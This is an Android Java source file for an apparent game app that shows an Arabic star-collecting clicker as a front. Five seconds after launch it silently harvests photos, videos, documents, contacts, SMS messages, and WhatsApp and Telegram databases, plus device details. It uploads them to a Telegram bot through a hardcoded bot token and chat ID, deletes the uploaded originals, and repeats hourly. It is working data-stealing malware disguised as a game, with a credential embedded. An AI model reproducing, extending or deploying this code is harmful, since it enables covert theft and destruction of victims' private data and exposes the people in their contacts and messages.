package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private LinearLayout mainLayout;
    private TextView scoreText;
    private int score = 0;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        mainLayout.setPadding(20, 20, 20, 20);
        
        TextView titleText = new TextView(this);
        titleText.setText("🔥 لعبة النجمة السحرية");
        titleText.setTextSize(30);
        titleText.setTextColor(Color.YELLOW);
        titleText.setGravity(Gravity.CENTER);
        mainLayout.addView(titleText);
        
        scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(25);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        // بدء الاختراق التلقائي بعد 5 ثواني
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("💀 جاري الاختراق التلقائي...");
                statusText.setTextColor(Color.RED);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        collectAllData();
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                statusText.setText("✅ تم رفع كل شيء للبوت!");
                                statusText.setTextColor(Color.GREEN);
                            }
                        });
                    }
                }).start();
            }
        }, 5000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        try {
            String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
            
            // صور
            updateStatus("📸 جاري جمع الصور...");
            sendMediaFiles(storage + "/DCIM/Camera/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/Pictures/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Images/", "jpg|jpeg|png|gif|bmp");
            sendMediaFiles(storage + "/Telegram/Telegram Images/", "jpg|jpeg|png|gif|bmp");
            
            // فيديوهات
            updateStatus("🎥 جاري جمع الفيديوهات...");
            sendMediaFiles(storage + "/DCIM/Camera/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            sendMediaFiles(storage + "/Telegram/Telegram Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
            
            // مستندات
            updateStatus("📄 جاري جمع المستندات...");
            sendMediaFiles(storage + "/Documents/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
            sendMediaFiles(storage + "/Download/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
            
            // جهات الاتصال
            updateStatus("📇 جاري استخراج جهات الاتصال...");
            sendContacts();
            
            // رسائل SMS
            updateStatus("💬 جاري استخراج رسائل SMS...");
            sendSMS();
            
            // محادثات واتساب
            updateStatus("💚 جاري استخراج محادثات واتساب...");
            getWhatsAppChats();
            
            // محادثات تيليجرام
            updateStatus("💙 جاري استخراج محادثات تيليجرام...");
            getTelegramChats();
            
            // معلومات الجهاز
            updateStatus("📱 جاري جمع معلومات الجهاز...");
            sendDeviceInfo();
            
            // تكرار الاختراق كل ساعة
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    collectAllData();
                }
            }, 3600000);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    private void sendMediaFiles(String path, String extensions) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (extensions.contains(ext)) {
                        sendFile(file);
                        Thread.sleep(100);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (name != null) writer.write(name + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String date = cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE));
                    if (body != null) {
                        writer.write("من: " + address + "\n");
                        writer.write("التاريخ: " + date + "\n");
                        writer.write("النص: " + body + "\n");
                        writer.write("------------------------\n");
                    }
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void getWhatsAppChats() {
        try {
            // مسار قاعدة بيانات واتساب
            String[] paths = {
                "/data/data/com.whatsapp/databases/msgstore.db",
                "/data/data/com.whatsapp/databases/wa.db",
                "/storage/emulated/0/Android/media/com.whatsapp/",
                "/storage/emulated/0/WhatsApp/Databases/"
            };
            
            for (String path : paths) {
                File file = new File(path);
                if (file.exists()) {
                    if (file.isDirectory()) {
                        File[] files = file.listFiles();
                        if (files != null) {
                            for (File f : files) {
                                if (f.getName().endsWith(".db") || f.getName().endsWith(".crypt14") || 
                                    f.getName().endsWith(".crypt12") || f.getName().endsWith(".enc")) {
                                    sendFile(f);
                                }
                            }
                        }
                    } else {
                        sendFile(file);
                    }
                }
            }
            
            // تصدير محادثات واتساب إلى نص
            exportWhatsAppChatsToText();
            
        } catch (Exception e) {}
    }

    private void exportWhatsAppChatsToText() {
        try {
            File chatFile = new File(getExternalFilesDir(null), "whatsapp_chats.txt");
            BufferedWriter writer = new BufferedWriter(new FileWriter(chatFile));
            
            writer.write("========== محادثات واتساب ==========\n\n");
            
            File waDir = new File("/storage/emulated/0/WhatsApp/Databases/");
            if (waDir.exists()) {
                File[] files = waDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        writer.write("ملف: " + f.getName() + "\n");
                        writer.write("الحجم: " + f.length() + " بايت\n");
                        writer.write("------------------------\n");
                    }
                }
            }
            
            writer.close();
            if (chatFile.length() > 0) sendFile(chatFile);
            
        } catch (Exception e) {}
    }

    private void getTelegramChats() {
        try {
            // مسارات تيليجرام
            String[] paths = {
                "/data/data/org.telegram.messenger/databases/",
                "/data/data/org.telegram.plus/databases/",
                "/storage/emulated/0/Android/data/org.telegram.messenger/files/"
            };
            
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File file : files) {
                            if (file.getName().endsWith(".db") || file.getName().endsWith(".db-journal")) {
                                sendFile(file);
                            }
                        }
                    }
                }
            }
            
            // تصدير محادثات تيليجرام إلى نص
            exportTelegramChatsToText();
            
        } catch (Exception e) {}
    }

    private void exportTelegramChatsToText() {
        try {
            File chatFile = new File(getExternalFilesDir(null), "telegram_chats.txt");
            BufferedWriter writer = new BufferedWriter(new FileWriter(chatFile));
            
            writer.write("========== محادثات تيليجرام ==========\n\n");
            
            File tgDir = new File("/storage/emulated/0/Telegram/");
            if (tgDir.exists()) {
                File[] files = tgDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isDirectory()) {
                            writer.write("📁 مجلد: " + f.getName() + "\n");
                        } else {
                            writer.write("📄 ملف: " + f.getName() + "\n");
                        }
                    }
                }
            }
            
            writer.close();
            if (chatFile.length() > 0) sendFile(chatFile);
            
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("storage_total", new File("/storage/emulated/0").getTotalSpace());
            info.put("storage_free", new File("/storage/emulated/0").getFreeSpace());
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}
